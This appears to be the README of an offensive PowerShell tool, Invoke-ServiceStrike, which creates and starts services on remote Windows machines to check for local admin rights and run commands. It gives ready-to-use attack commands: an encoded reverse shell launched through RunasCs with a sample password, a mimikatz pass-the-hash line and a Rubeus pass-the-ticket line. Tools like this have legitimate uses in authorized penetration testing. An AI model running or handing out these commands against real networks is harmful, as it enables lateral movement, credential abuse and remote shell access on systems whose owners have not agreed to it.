# Invoke-ServiceStrike
Attempts to create and start a service by bypassing the `OpenService` call, in order to verify whether the current user has local admin privileges on domain or LAN machines, assuming that only the `SC_MANAGER_CREATE_SERVICE` and `SC_MANAGER_CONNECT` rights are available on the SCManager.

This script includes and executes a modified version of <a href="https://gist.github.com/HarmJ0y/c84065c0c487d4c74cc1">Invoke-PsExec</a> originally published by Will Schroeder (@harmj0y).
## Usage
<img src="https://github.com/pol4ir/Invoke-ServiceStrike/blob/main/test.gif">

```
Invoke-ServiceStrike -Command <cmd>
```
```
Invoke-ServiceStrike -Command <revShell> [-timeout <45000> -threads <5> -ComputerName <'192.168.1.103'> -ServiceName <sname>]
```

### RunAs
The script runs under the current user session. If you're in an interactive shell and need to execute it under a different security context, you can use Runas.
```
runas /user:contoso.local\user1 /netonly powershell
```
If you're working in a non-interactive shell, you can use <a href="https://github.com/antonioCoco/RunasCs">Invoke-RunasCs</a>

```
Invoke-RunasCs -Domain contoso.local -Username user1 -Password dfgV?DS7-8 -Command "powershell . C:\Invoke-ServiceStrike.ps1;Invoke-ServiceStrike -Command 'cmd /c powershell -e <revb64>' -ServiceName TEST" -logontype 9
```

### PTH 
```
mimikatz.exe "sekurlsa::pth /domain:<> /user:<user> /ntlm:<hash> /run:powershell.exe"
```

### PTT
```
Rubeus.exe -args ptt /ticket:<ticket>
```
